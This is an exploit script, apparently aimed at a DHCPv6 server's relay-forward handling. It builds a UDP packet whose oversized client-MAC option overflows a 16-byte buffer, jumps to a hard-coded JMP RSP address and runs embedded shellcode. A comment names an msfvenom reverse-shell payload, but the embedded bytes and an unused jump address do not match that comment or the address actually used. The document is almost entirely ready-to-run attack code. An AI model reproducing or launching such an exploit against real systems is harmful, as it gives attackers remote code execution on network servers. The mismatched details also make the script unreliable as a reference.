#!/usr/bin/python

from struct import pack
import sys
import socket
import binascii

#usage : python3 exploit.py fe80::6784:87e7:b6eb:db99 547
# msfvenom -p linux/x64/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00\x0a\x0d\x20" -f python

buf =  b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
jmp = 0x0000000000452797

def send_packet(data, host, port):
    print("[+] sending {} bytes to {}:{}".format(len(data), host, port))
    s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, socket.IPPROTO_UDP)

    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, len(data))
    if s.sendto(data, (host, port)) != len(data):
        print("[!] Could not send (full) payload")
    s.close()

def u8(x):
    return pack("B", x)

def u16(x):
    return pack("!H", x)

def gen_option(option, data, length=None):
    if length is None:
        length = len(data)

    return b"".join([
        u16(option),
        u16(length),
        data
    ])

if __name__ == '__main__':
    assert len(sys.argv) == 3, "{} <ip> <port>".format(sys.argv[0])
    pkg = b"".join([
        u8(12),                         # DHCP6RELAYFORW
        u16(0x0313), u8(0x37),          # transaction ID
        b"_" * (34 - 4),
        # Option 79 = OPTION6_CLIENT_MAC
        # Moves argument into char[DHCP_CHADDR_MAX], DHCP_CHADDR_MAX = 16
        gen_option(79, b"A"*50 + pack("<Q",0x000000000045269f) + b"\x90" *16 + buf),
    ])

    print("[+] Packer Header (38 bytes):")
    print(binascii.hexlify(pkg)[0:76])
    print("[+] JMP RSP address: " + "0x000000000045269f")
    print("[+] Payload bytes:")
    print(binascii.hexlify(pkg)[76:280])
    host, port = sys.argv[1:]
    send_packet(pkg, host, int(port))
